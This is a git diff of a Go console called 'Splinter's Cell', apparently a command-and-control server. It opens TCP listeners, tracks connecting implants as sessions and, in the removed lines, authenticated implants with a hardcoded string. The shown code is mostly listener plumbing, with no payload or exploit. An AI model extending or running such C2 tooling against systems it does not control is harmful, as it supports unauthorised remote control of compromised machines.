@@ -9,151 +9,119 @@ import (
 	"strings"
 )
 
-func makeListener(port string) (bool, net.Listener) {
-	addr := ":" + port
-	addr = strings.TrimSuffix(addr, "\n") //Ntibihla haydeh ktiir mi2ziyeh
-	tcpAddr, err := net.ResolveTCPAddr("tcp4", addr)
-	if err != nil {
-		return false, nil
-	}
-	tcpListener, err := net.ListenTCP("tcp", tcpAddr)
-	if err != nil {
-		return false, nil
-	}
-	return true, tcpListener
+// Always define your structs before functions
+type Listener struct {
+	//cName    string
+	port     string
+	status   string
+	listener net.Listener
+	conn     net.Conn
+	next     *Listener
 }
-
-func listen(tcpListen net.Listener) (bool, net.Conn) {
-	conn, err := tcpListen.Accept()
-	if err != nil {
-		fmt.Println("Error Accpeting Connection")
-		return false, nil
-	}
-	auth := make([]byte, 32)
-	read_len, err := conn.Read(auth)
-	if read_len < 1 {
-		fmt.Println("Auth Failed. Bytes < 1")
-		tcpListen.Close()
-		return false, nil
-	}
-	if err != nil {
-		fmt.Println("Something went wrong reading from the connection")
-		tcpListen.Close()
-		return false, nil
-	}
-	authString := string(auth[:read_len])
-	if authString != "i_L0V_y0U_Ju5t1n_P3t3R\n" {
-		fmt.Println("Implant failed to authenticate")
-		tcpListen.Close()
-		return false, nil
-	}
-	return true, conn
-}
-
-func (list *clientList) registerClient(net.Conn) {
-	newNode := &Client{}
-	if list.head == nil {
-		list.head = newNode
-	} else {
-		current := list.head
-		for current.next != nil {
-			current = current.next
-		}
-		current.next = newNode
-	}
-}
-
-func (list *clientList) displayClient() {
-	current := list.head
-
-	if current == nil {
-		fmt.Println("Client list is empty")
-		return
-	}
-
-	fmt.Print("Linked list: ")
-	for current != nil {
-		fmt.Printf("%d ", current.name)
-		current = current.next
-	}
-	fmt.Println()
+type listenerList struct {
+	head *Listener
 }
 
 type clientList struct {
 	head *Client
 }
 type Client struct {
-	name  string
-	IP    string
+	name string
+	//IP    string
 	ID    int
 	state string
+	conn  net.Conn
 	next  *Client
 }
 
-func (list *listenerList) registerListener(port string) {
-	newListener := &Listener{port: port}
-	if list.head == nil {
-		list.head = newListener
-	} else {
-		current := list.head
-		for current.pListener != nil {
-			current = current.pListener
+func handleListen(command string, lList *listenerList, cList *clientList) {
+	command = strings.TrimSuffix(command, "\n")
+	regexListen := regexp.MustCompile(`listen -p \d+`)
+	matchListen := regexListen.FindString(command)
+	if matchListen != "" {
+		command = strings.Split(command, " -p ")[1]
+		status, tcpListen := makeListener(command)
+		if !status {
+			fmt.Println("Could not create listener")
+			return
 		}
-		current.pListener = newListener
+		defer tcpListen.Close()
+		lList.registerListener(command, tcpListen)
+		cConn := make(chan net.Conn, 1)
+		//go listen(tcpListen) //Sexiest Shit Ever
+		go listen2(tcpListen, cConn, lList)
+		go cList.registerClient2(cConn)
 	}
 }
+func handleListen2(command string, lList *listenerList, cList *clientList) {
+	command = strings.TrimSuffix(command, "\n")
+	regexListen := regexp.MustCompile(`listen -p \d+`)
+	matchListen := regexListen.FindString(command)
+	if matchListen != "" {
+		command = strings.Split(command, " -p ")[1]
+		command = ":" + command
+		command = strings.TrimSuffix(command, "\n")
+		tcpAddr, err := net.ResolveTCPAddr("tcp4", command)
+		if err != nil {
+			fmt.Println("Couldnt resolve tcp address")
+			os.Exit(0)
+		}
+		tcpListener, err := net.ListenTCP("tcp", tcpAddr)
+		if err != nil {
+			fmt.Println("Something went wrong")
+		}
+		lList.registerListener(command, tcpListener)
+		defer tcpListener.Close()
+		fmt.Println("Listening on Port " + command)
+		for {
+			conn, err := tcpListener.Accept()
+			if err != nil {
+				fmt.Println("Could not accept connection")
+				continue
+			}
+			go handleClient(conn, lList, command)
+		}
+	}
 
-func (list *listenerList) displayListeners() {
-	current := list.head
-	if current == nil {
-		fmt.Println("List is empty")
-		return
-	}
-	for current.pListener != nil {
-		fmt.Println(current.port)
-		current = current.pListener
-	}
-}
-
-type Listener struct {
-	port      string
-	pListener *Listener
-}
-type listenerList struct {
-	head *Listener
 }
 
 func main() {
 	fmt.Println("Splinter's Cell")
-	listnerList := listenerList{}
+	lList := listenerList{}
+	cList := clientList{}
 	reader := bufio.NewReader(os.Stdin)
 	for {
 		fmt.Print("SPLINTER >>> ")
-		command, err := reader.ReadString('\n')
-		//Below the madness begins
-		regexListen := regexp.MustCompile(`listen -p \d+`)
-		matchListen := regexListen.FindString(command)
-		if matchListen != "" {
-			command = strings.Split(command, " -p ")[1]
-			//fmt.Println(command)
-			//status, tcpListener := makeListener(command)
-			//service := ":1234"
-			status, tcpListener := makeListener(command)
-			if !status {
-				fmt.Println("Could not create listener")
-				continue
-			}
-			listnerList.registerListener(command)
-			listen(tcpListener)
-		}
+		command, err := reader.ReadString('\n') //Returns up to AND including \n
 		if err != nil {
 			fmt.Println("Error reading input:", err)
 			continue
 		}
+
+		//Below the madness begins
+		//handleListen(command, &lList, &cList)
+		handleListen2(command, &lList, &cList)
+
 		command = strings.TrimSpace(command)
 		switch command {
 		case "listen":
-			fmt.Println("Create a listener with the following: listener -p <port>")
+			fmt.Println("Create a listener with: listen -p <port>")
+			fmt.Println("List active listeners : listen --ls")
+			fmt.Println("Remove a listener with: listen --kill")
+		case "listen --ls":
+			lList.displayListeners()
+		case "listen --kill": //Now it works ?!
+			{
+				fmt.Print("Specify a listener to kill: ")
+				command, err = reader.ReadString('\n')
+				if err != nil {
+					fmt.Println("Error reading input:", err)
+					continue
+				}
+				lList.delListener(command)
+			}
+		case "session ls":
+			cList.displayClient()
 		case "kill":
 			fmt.Println("Kills an implant and 'one day' performs cleanup: kill <clientID>")
 		case "session":
